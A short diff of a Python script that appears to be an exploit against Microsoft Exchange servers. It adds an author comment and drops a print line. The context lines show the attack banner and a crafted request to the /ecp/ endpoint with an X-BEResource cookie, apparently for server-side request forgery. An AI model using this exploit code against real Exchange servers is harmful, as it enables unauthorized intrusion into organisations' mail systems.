@@ -3,7 +3,7 @@ from urllib3.exceptions import InsecureRequestWarning
 import random
 import string
 import sys
-
+#write by jang aka tesanull
 
 def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
@@ -32,7 +32,7 @@ autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange
 
 print("Attacking target " + target)
 print("=============================")
-print(legacyDnPatchByte.decode('hex'))
+
 FQDN = "EXCHANGE"
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                         "User-Agent": user_agent},
